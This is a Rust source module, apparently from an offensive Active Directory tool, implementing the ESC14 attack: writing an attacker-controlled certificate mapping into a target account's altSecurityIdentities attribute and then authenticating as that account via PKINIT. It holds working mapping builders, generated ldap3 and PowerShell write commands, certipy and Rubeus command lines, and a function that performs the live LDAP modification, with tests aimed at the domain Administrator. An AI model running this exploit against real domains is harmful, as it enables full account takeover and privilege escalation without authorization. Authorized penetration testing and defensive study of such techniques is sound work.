//! ESC14 — Certificate Mapping via `altSecurityIdentities` Abuse
//!
//! ESC14 targets the Active Directory certificate-to-account mapping mechanism.
//! When an attacker has **WriteAltSecurityIdentities** (or **GenericAll** /
//! **GenericWrite**) over a target principal, they can map an attacker-controlled
//! certificate to that account by modifying the `altSecurityIdentities`
//! attribute.
//!
//! **Vulnerable configuration:**
//! - The attacker can write to the `altSecurityIdentities` attribute on the
//!   target account (via ACL abuse).
//! - The domain's certificate mapping policy (either `StrongCertificateBindingEnforcement`
//!   or `CertificateMappingMethods`) allows the mapping style the attacker uses.
//!
//! **Attack flow:**
//! 1. Obtain or create a certificate whose Subject or SAN values the attacker
//!    controls (any ADCS ESC, or even a self-signed certificate).
//! 2. Identify a target account where the current principal holds
//!    `WriteAltSecurityIdentities` or equivalent.
//! 3. Compute the X509 mapping string for the certificate (Issuer+Serial, SKI,
//!    SHA1 hash, or RFC822 mapping).
//! 4. Write the mapping value into the target's `altSecurityIdentities`.
//! 5. Authenticate via PKINIT using the mapped certificate → obtain a TGT as
//!    the target principal.
//! 6. Clean up: restore the original `altSecurityIdentities` value.
//!
//! Reference: SpecterOps "Certified Pre-Owned" (2021), Oliver Lyak (2024)

use crate::error::{OverthroneError, Result};
use tracing::info;

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// LDAP attribute for certificate-to-account mapping
pub const ALT_SECURITY_IDENTITIES: &str = "altSecurityIdentities";

/// Mapping prefix for X509 Issuer+Serial style
pub const X509_ISSUER_SERIAL_PREFIX: &str = "X509:<I>";

/// Mapping prefix for X509 Subject Key Identifier
pub const X509_SKI_PREFIX: &str = "X509:<SKI>";

/// Mapping prefix for X509 SHA1 public key hash
pub const X509_SHA1_PREFIX: &str = "X509:<SHA1-PUKEY>";

/// Mapping prefix for X509 RFC822 (email / UPN)
pub const X509_RFC822_PREFIX: &str = "X509:<RFC822>";

/// Mapping prefix for Kerberos principal style
pub const KERBEROS_PREFIX: &str = "Kerberos:";

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// The style of certificate mapping used in `altSecurityIdentities`
#[derive(Debug, Clone, PartialEq)]
pub enum MappingStyle {
    /// `X509:<I>issuer<S>subject` — Issuer + Subject DN
    IssuerSubject,
    /// `X509:<I>issuer<SR>serialnumber` — Issuer + Serial (reversed hex)
    IssuerSerial,
    /// `X509:<SKI>subjectkeyidentifier` — Subject Key Identifier
    SubjectKeyIdentifier,
    /// `X509:<SHA1-PUKEY>hash` — SHA1 of the DER-encoded public key
    Sha1PublicKey,
    /// `X509:<RFC822>email` — RFC822 / UPN
    Rfc822,
}

impl MappingStyle {
    /// Return the human-readable label for logging
    pub fn label(&self) -> &'static str {
        match self {
            Self::IssuerSubject => "Issuer+Subject",
            Self::IssuerSerial => "Issuer+Serial",
            Self::SubjectKeyIdentifier => "SKI",
            Self::Sha1PublicKey => "SHA1-PUKEY",
            Self::Rfc822 => "RFC822/UPN",
        }
    }
}

/// Configuration for an ESC14 attack
#[derive(Debug, Clone)]
pub struct Esc14Config {
    /// Target account DN whose `altSecurityIdentities` will be modified
    pub target_dn: String,
    /// Target account sAMAccountName
    pub target_sam: String,
    /// The certificate mapping string to write
    pub mapping_value: String,
    /// Which mapping style to use
    pub mapping_style: MappingStyle,
    /// DC IP/hostname for LDAP modification
    pub dc_host: String,
    /// Domain name (e.g. corp.local)
    pub domain: String,
    /// Whether to use LDAPS
    pub use_ldaps: bool,
}

/// Result of an ESC14 assessment / attack
#[derive(Debug, Clone)]
pub struct Esc14Result {
    /// Whether the mapping was written successfully
    pub mapping_written: bool,
    /// The mapping value that was (or would be) written
    pub mapping_value: String,
    /// The mapping style used
    pub mapping_style_label: String,
    /// PKINIT command to authenticate as the target
    pub pkinit_command: String,
    /// Cleanup command to restore the original mapping
    pub cleanup_command: String,
    /// Human-readable impact description
    pub impact_description: String,
    /// Operator guidance steps
    pub guidance: Vec<String>,
}

/// Accounts vulnerable to ESC14 discovered during enumeration
#[derive(Debug, Clone)]
pub struct Esc14VulnerableTarget {
    /// Target account DN
    pub target_dn: String,
    /// Target sAMAccountName
    pub target_sam: String,
    /// The principal that has write access
    pub writer_principal: String,
    /// The specific right (WriteAltSecurityIdentities, GenericAll, GenericWrite, etc.)
    pub abusable_right: String,
    /// Whether the target is a high-value account
    pub high_value: bool,
}

// ─────────────────────────────────────────────────────────
//  Mapping builders
// ─────────────────────────────────────────────────────────

/// Build an `X509:<I>issuer<S>subject` mapping string from certificate DER
pub fn build_issuer_subject_mapping(cert_der: &[u8]) -> Result<String> {
    use x509_parser::parse_x509_certificate;

    let (_, cert) = parse_x509_certificate(cert_der).map_err(|e| {
        OverthroneError::Adcs(format!("Failed to parse certificate for mapping: {e}"))
    })?;

    let issuer = cert.issuer().to_string();
    let subject = cert.subject().to_string();

    Ok(format!("X509:<I>{}<S>{}", issuer, subject))
}

/// Build an `X509:<I>issuer<SR>serial` mapping string from certificate DER
pub fn build_issuer_serial_mapping(cert_der: &[u8]) -> Result<String> {
    use x509_parser::parse_x509_certificate;

    let (_, cert) = parse_x509_certificate(cert_der).map_err(|e| {
        OverthroneError::Adcs(format!("Failed to parse certificate for mapping: {e}"))
    })?;

    let issuer = cert.issuer().to_string();
    let serial = cert.raw_serial_as_string();

    // AD expects the serial in reversed byte order (little-endian hex)
    let serial_bytes: Vec<u8> = cert.tbs_certificate.raw_serial().to_vec();
    let reversed: String = serial_bytes
        .iter()
        .rev()
        .map(|b| format!("{:02x}", b))
        .collect();

    info!(
        "ESC14: Certificate serial {} → reversed for mapping: {}",
        serial, reversed
    );

    Ok(format!("X509:<I>{}<SR>{}", issuer, reversed))
}

/// Build an `X509:<SHA1-PUKEY>hash` mapping from certificate DER
pub fn build_sha1_pubkey_mapping(cert_der: &[u8]) -> Result<String> {
    use sha1::{Digest, Sha1};
    use x509_parser::parse_x509_certificate;

    let (_, cert) = parse_x509_certificate(cert_der).map_err(|e| {
        OverthroneError::Adcs(format!("Failed to parse certificate for mapping: {e}"))
    })?;

    let pubkey_raw = cert.tbs_certificate.subject_pki.subject_public_key.as_ref();
    let hash = Sha1::digest(pubkey_raw);
    let hex_hash = hex::encode(hash);

    Ok(format!("X509:<SHA1-PUKEY>{}", hex_hash))
}

/// Build an `X509:<RFC822>email` mapping from a UPN
pub fn build_rfc822_mapping(upn: &str) -> String {
    format!("X509:<RFC822>{}", upn)
}

// ─────────────────────────────────────────────────────────
//  LDAP operations
// ─────────────────────────────────────────────────────────

/// Generate the LDAP filter to find accounts with writable
/// `altSecurityIdentities` by a specific principal SID.
/// This is a simplification — full ACL parsing requires SDDL analysis;
/// this filter finds accounts that already have the attribute populated.
pub fn alt_security_identities_filter() -> &'static str {
    "(altSecurityIdentities=*)"
}

/// LDAP modification command to write the mapping (guidance-only output)
pub fn ldap_write_command(target_dn: &str, mapping_value: &str, dc: &str, ldaps: bool) -> String {
    let protocol = if ldaps { "ldaps" } else { "ldap" };
    format!(
        "# Write certificate mapping to target account\n\
         python3 -c \"\n\
         import ldap3\n\
         server = ldap3.Server('{protocol}://{dc}', get_info=ldap3.ALL)\n\
         conn = ldap3.Connection(server, auto_bind=True, authentication=ldap3.NTLM, \\\n\
             user='DOMAIN\\\\user', password='password')\n\
         conn.modify('{target_dn}', {{\n\
             'altSecurityIdentities': [(ldap3.MODIFY_ADD, ['{mapping_value}'])]\n\
         }})\n\
         print(conn.result)\n\
         \"\n\
         # OR with PowerShell:\n\
         Set-ADUser -Identity '{target_dn}' -Add @{{\n\
             altSecurityIdentities = '{mapping_value}'\n\
         }}"
    )
}

/// LDAP modification command to clean up (restore original value)
pub fn ldap_cleanup_command(target_dn: &str, mapping_value: &str, dc: &str, ldaps: bool) -> String {
    let protocol = if ldaps { "ldaps" } else { "ldap" };
    format!(
        "# Remove certificate mapping from target account (CLEANUP)\n\
         python3 -c \"\n\
         import ldap3\n\
         server = ldap3.Server('{protocol}://{dc}', get_info=ldap3.ALL)\n\
         conn = ldap3.Connection(server, auto_bind=True, authentication=ldap3.NTLM, \\\n\
             user='DOMAIN\\\\user', password='password')\n\
         conn.modify('{target_dn}', {{\n\
             'altSecurityIdentities': [(ldap3.MODIFY_DELETE, ['{mapping_value}'])]\n\
         }})\n\
         print(conn.result)\n\
         \"\n\
         # OR with PowerShell:\n\
         Set-ADUser -Identity '{target_dn}' -Remove @{{\n\
             altSecurityIdentities = '{mapping_value}'\n\
         }}"
    )
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC14 exploiter — `altSecurityIdentities` certificate mapping abuse
pub struct Esc14Exploiter;

impl Esc14Exploiter {
    /// Create a new ESC14 exploiter
    pub fn new() -> Self {
        Self
    }

    /// Generate operator guidance for ESC14 exploitation.
    /// ESC14 is primarily an ACL-dependent attack: the attacker must have
    /// write access to `altSecurityIdentities` on the target account.  This
    /// method produces the concrete commands and steps for the operator.
    pub fn assess(&self, config: &Esc14Config) -> Result<Esc14Result> {
        info!(
            "ESC14: Assessing certificate mapping attack against {}",
            config.target_sam
        );

        let _write_cmd = ldap_write_command(
            &config.target_dn,
            &config.mapping_value,
            &config.dc_host,
            config.use_ldaps,
        );

        let cleanup_cmd = ldap_cleanup_command(
            &config.target_dn,
            &config.mapping_value,
            &config.dc_host,
            config.use_ldaps,
        );

        let pkinit_command = format!(
            "certipy auth -pfx attacker.pfx -dc-ip {} -domain {}\n\
             # OR:\n\
             Rubeus.exe asktgt /user:{} /certificate:attacker.pfx /domain:{} /nowrap",
            config.dc_host, config.domain, config.target_sam, config.domain
        );

        let guidance = vec![
            format!(
                "1. Confirm WriteAltSecurityIdentities (or GenericAll/GenericWrite) over '{}'.",
                config.target_dn
            ),
            format!(
                "2. Record the current altSecurityIdentities value (may be empty): \
                 Get-ADUser '{}' -Properties altSecurityIdentities",
                config.target_sam
            ),
            format!(
                "3. Obtain or generate a certificate (any ESC, or self-signed): \
                 the certificate's {} mapping must be computed.",
                config.mapping_style.label()
            ),
            format!(
                "4. Write the mapping to the target account:\n   {}",
                config.mapping_value
            ),
            "5. Authenticate via PKINIT with the mapped certificate.".to_string(),
            "6. CLEANUP: Remove the mapping value and restore the original attribute.".to_string(),
        ];

        let impact_description = format!(
            "ESC14: By writing a {} certificate mapping ('{}') to the altSecurityIdentities \
             attribute of '{}', any holder of the corresponding private key can authenticate \
             as '{}' via PKINIT. This grants full account takeover without knowing the \
             account's password.",
            config.mapping_style.label(),
            config.mapping_value,
            config.target_sam,
            config.target_sam
        );

        Ok(Esc14Result {
            mapping_written: false, // guidance-only by default
            mapping_value: config.mapping_value.clone(),
            mapping_style_label: config.mapping_style.label().to_string(),
            pkinit_command,
            cleanup_command: cleanup_cmd,
            impact_description,
            guidance,
        })
    }

    /// Execute the full ESC14 attack with live LDAP modification.
    /// This writes the mapping, but the caller must authenticate with the
    /// certificate separately (PKINIT is out-of-band).
    pub async fn exploit_with_ldap(
        &self,
        config: &Esc14Config,
        ldap_user: &str,
        ldap_pass: &str,
    ) -> Result<Esc14Result> {
        info!(
            "ESC14: Writing certificate mapping to {} via LDAP",
            config.target_dn
        );

        // Connect to DC via LDAP
        let mut session = crate::proto::ldap::LdapSession::connect(
            &config.dc_host,
            &config.domain,
            ldap_user,
            ldap_pass,
            config.use_ldaps,
        )
        .await
        .map_err(|e| OverthroneError::EscAttack {
            esc_number: 14,
            reason: format!("LDAP connection failed: {e}"),
        })?;

        // Read current value for cleanup
        let current = session
            .read_attribute(&config.target_dn, ALT_SECURITY_IDENTITIES)
            .await
            .unwrap_or_default();

        info!("ESC14: Current altSecurityIdentities = {:?}", current);

        // Write the mapping
        session
            .modify_add(
                &config.target_dn,
                ALT_SECURITY_IDENTITIES,
                std::slice::from_ref(&config.mapping_value),
            )
            .await
            .map_err(|e| OverthroneError::EscAttack {
                esc_number: 14,
                reason: format!("Failed to write altSecurityIdentities: {e}"),
            })?;

        info!(
            "ESC14: Successfully wrote mapping '{}' to '{}'",
            config.mapping_value, config.target_dn
        );

        let _ = session.disconnect().await;

        let mut result = self.assess(config)?;
        result.mapping_written = true;
        Ok(result)
    }
}

impl Default for Esc14Exploiter {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rfc822_mapping() {
        let mapping = build_rfc822_mapping("administrator@corp.local");
        assert!(mapping.starts_with("X509:<RFC822>"));
        assert!(mapping.contains("administrator@corp.local"));
    }

    #[test]
    fn test_alt_security_identities_filter() {
        let filter = alt_security_identities_filter();
        assert!(filter.contains("altSecurityIdentities"));
    }

    #[test]
    fn test_mapping_style_labels() {
        assert_eq!(MappingStyle::IssuerSubject.label(), "Issuer+Subject");
        assert_eq!(MappingStyle::IssuerSerial.label(), "Issuer+Serial");
        assert_eq!(MappingStyle::SubjectKeyIdentifier.label(), "SKI");
        assert_eq!(MappingStyle::Sha1PublicKey.label(), "SHA1-PUKEY");
        assert_eq!(MappingStyle::Rfc822.label(), "RFC822/UPN");
    }

    #[test]
    fn test_ldap_write_command_ldaps() {
        let cmd = ldap_write_command(
            "CN=admin,CN=Users,DC=corp,DC=local",
            "X509:<RFC822>admin@corp.local",
            "dc01.corp.local",
            true,
        );
        assert!(cmd.contains("ldaps://"));
        assert!(cmd.contains("altSecurityIdentities"));
    }

    #[test]
    fn test_ldap_cleanup_command() {
        let cmd = ldap_cleanup_command(
            "CN=admin,CN=Users,DC=corp,DC=local",
            "X509:<RFC822>admin@corp.local",
            "dc01.corp.local",
            false,
        );
        assert!(cmd.contains("MODIFY_DELETE"));
        assert!(cmd.contains("CLEANUP"));
    }

    #[test]
    fn test_esc14_assess_produces_guidance() {
        let exploiter = Esc14Exploiter::new();
        let config = Esc14Config {
            target_dn: "CN=Administrator,CN=Users,DC=corp,DC=local".to_string(),
            target_sam: "Administrator".to_string(),
            mapping_value: "X509:<RFC822>administrator@corp.local".to_string(),
            mapping_style: MappingStyle::Rfc822,
            dc_host: "dc01.corp.local".to_string(),
            domain: "corp.local".to_string(),
            use_ldaps: false,
        };

        let result = exploiter.assess(&config).unwrap();
        assert!(!result.mapping_written);
        assert!(!result.guidance.is_empty());
        assert!(result.pkinit_command.contains("certipy"));
        assert!(result.impact_description.contains("ESC14"));
    }
}
